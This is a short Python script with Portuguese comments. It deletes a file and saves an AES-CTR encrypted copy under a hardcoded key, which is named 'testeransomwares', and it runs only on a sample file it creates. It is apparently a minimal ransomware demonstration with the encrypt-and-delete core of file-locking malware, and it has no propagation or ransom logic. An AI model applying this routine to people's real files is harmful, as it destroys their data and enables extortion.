import os
import pyaes

def encrypt_file(file_name: str, encryption_key: bytes):
    # Abrir o arquivo a ser criptografado
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Remover o arquivo original
    os.remove(file_name)

    # Criar a instância de criptografia
    aes = pyaes.AESModeOfOperationCTR(encryption_key)

    # Criptografar os dados
    encrypted_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    encrypted_file_name = file_name + ".encrypted"
    with open(encrypted_file_name, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)

    print(f"Arquivo criptografado: {encrypted_file_name}")

# Exemplo de uso
key = b"testeransomwares"  # Chave de 16 bytes
file_name = "teste.txt"

# Criar um arquivo de exemplo
with open(file_name, "w") as file:
    file.write("alo brasil")

encrypt_file(file_name, key)
